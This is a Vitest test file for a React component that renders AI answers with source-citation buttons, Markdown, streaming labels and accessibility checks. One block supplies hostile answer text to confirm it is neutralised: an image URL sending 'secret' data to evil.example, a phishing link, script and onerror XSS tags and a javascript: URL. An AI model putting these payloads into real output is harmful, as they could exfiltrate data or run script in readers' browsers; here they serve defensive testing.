import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import type { Citation } from '@atlas/shared';
import { expectNoAxeViolations } from '@/test/render';
import Answer from './Answer';

const known = [
  { n: 1, documentName: 'report.pdf', page: 3 },
  { n: 2, documentName: 'notes.md', page: 1 },
];
const citation = (n: number): Citation => ({
  n,
  chunkId: `c${n}`,
  documentId: `d${n}`,
  documentName: known[n - 1]!.documentName,
  page: known[n - 1]!.page,
  quote: 'quoted',
});
const citations = [citation(1), citation(2)];

describe('Answer', () => {
  it('draws a citation as a button that names its source and opens it', async () => {
    const onOpen = vi.fn();
    render(
      <Answer content="Revenue grew [S1]." known={known} citations={citations} onOpen={onOpen} />,
    );

    const chip = screen.getByRole('button', { name: 'Source S1: report.pdf, page 3' });
    await userEvent.click(chip);
    expect(onOpen).toHaveBeenCalledWith(citations[0]);
    expect(screen.queryByText('[S1]')).not.toBeInTheDocument();
  });

  it('draws each number of a group as its own citation', () => {
    render(
      <Answer
        content="Both agree [S1, S2]."
        known={known}
        citations={citations}
        onOpen={() => {}}
      />,
    );
    expect(screen.getAllByRole('button')).toHaveLength(2);
  });

  it('shows a citation as a plain label, not a button, while the answer is still being written', () => {
    render(<Answer content="Growing [S2]" known={known} />);
    expect(screen.queryByRole('button')).not.toBeInTheDocument();
    expect(screen.getByRole('img', { name: 'Source S2: notes.md, page 1' })).toBeInTheDocument();
  });

  it('does not show a number that was never offered as a source', () => {
    render(
      <Answer
        content="Made up [S9] and real [S1]."
        known={known}
        citations={citations}
        onOpen={() => {}}
      />,
    );
    expect(screen.getAllByRole('button')).toHaveLength(1);
    expect(screen.queryByText(/S9/)).not.toBeInTheDocument();
  });

  it('renders Markdown formatting', () => {
    render(<Answer content={'**Bold** and a list:\n\n- one\n- two'} known={known} />);
    expect(screen.getByText('Bold').tagName).toBe('STRONG');
    expect(screen.getAllByRole('listitem')).toHaveLength(2);
  });

  describe('treats the answer as untrusted text', () => {
    it('shows an image as nothing, so it cannot send data to another site by URL', () => {
      const { container } = render(
        <Answer content="![x](https://evil.example/log?data=secret) done" known={known} />,
      );
      expect(container.querySelector('img')).toBeNull();
      expect(container.textContent).toContain('done');
    });

    it('shows a link as its text, so a reader is not sent anywhere', () => {
      const { container } = render(
        <Answer content="See [the report](https://evil.example/phish)." known={known} />,
      );
      expect(container.querySelector('a')).toBeNull();
      expect(container.textContent).toContain('the report');
    });

    it('does not turn a link that merely looks like a citation into one', () => {
      render(<Answer content="[click](#cite-7) [x](#cite-1)" known={known} />);
      // #cite-7 and #cite-1 written by hand are not markers the server resolved: no buttons, and no
      // chip for a number that was never offered
      expect(screen.queryByRole('button')).not.toBeInTheDocument();
    });

    it('shows raw HTML as text, never as elements', () => {
      const { container } = render(
        <Answer content={'<script>alert(1)</script><img src=x onerror=alert(1)>'} known={known} />,
      );
      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('img')).toBeNull();
    });

    it('does not run a javascript: URL', () => {
      const { container } = render(<Answer content="[go](javascript:alert(1))" known={known} />);
      expect(container.querySelector('a')).toBeNull();
    });
  });

  it('keeps the same chip element when it is drawn again, so keyboard focus is not lost', () => {
    const props = { content: 'Revenue grew [S1].', known, citations, onOpen: () => {} };
    const { rerender } = render(<Answer {...props} />);
    const before = screen.getByRole('button');
    before.focus();

    rerender(<Answer {...props} onOpen={() => {}} />);

    expect(screen.getByRole('button')).toBe(before);
    expect(document.activeElement).toBe(before);
  });

  it('has no accessibility violations', async () => {
    const { container } = render(
      <Answer
        content="Revenue grew [S1] and costs fell [S2]."
        known={known}
        citations={citations}
        onOpen={() => {}}
      />,
    );
    await expectNoAxeViolations(container);
  });
});
